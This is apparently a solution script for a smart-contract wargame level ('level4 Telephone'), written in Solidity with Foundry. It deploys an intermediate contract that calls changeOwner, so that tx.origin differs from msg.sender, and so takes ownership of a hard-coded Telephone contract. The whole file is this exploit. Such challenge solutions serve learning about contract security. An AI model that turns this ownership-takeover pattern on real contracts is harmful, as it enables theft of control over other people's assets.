// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Telephone} from "../src/level4Telephone.sol";

contract IntermediateContract {
    constructor(Telephone _telephone, address _newOwner) {
        _telephone.changeOwner(_newOwner);
    }
}

contract level4Solution is Script {
    Telephone telephone = Telephone(0x9Ac191c19e4dAE0215425Fa1238Ef4c430dF3FF5);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new IntermediateContract(telephone, vm.envAddress("MY_ADDRESS"));
        // console.log(telephone.owner());
        vm.stopBroadcast();
    }
}
